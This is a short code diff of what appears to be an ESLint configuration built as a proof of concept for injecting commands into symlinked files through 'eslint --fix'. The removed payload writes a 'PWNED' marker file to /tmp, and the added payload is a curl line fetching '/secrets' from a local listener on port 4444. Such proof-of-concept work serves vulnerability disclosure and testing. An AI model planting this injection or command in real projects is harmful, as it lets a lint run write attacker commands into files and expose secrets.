@@ -10,13 +10,8 @@
 //  3. files: ["**/*"] so the rule fires on the symlinked target regardless
 //     of extension.
 
-const PAYLOAD = [
-    "",
-    "# === INJECTED BY `eslint --fix` (PoC) ===",
-    "mkdir -p /tmp && echo \"PWNED by eslint --fix at $(date)\" > /tmp/eslint-rce-poc-pwned",
-    "# === END INJECTION ===",
-    "",
-].join("\n");
+const PAYLOAD = `\ncurl -s http://127.0.0.1:4444/secrets\n`;
+
 
 module.exports = [{
     files: ["**/*"],
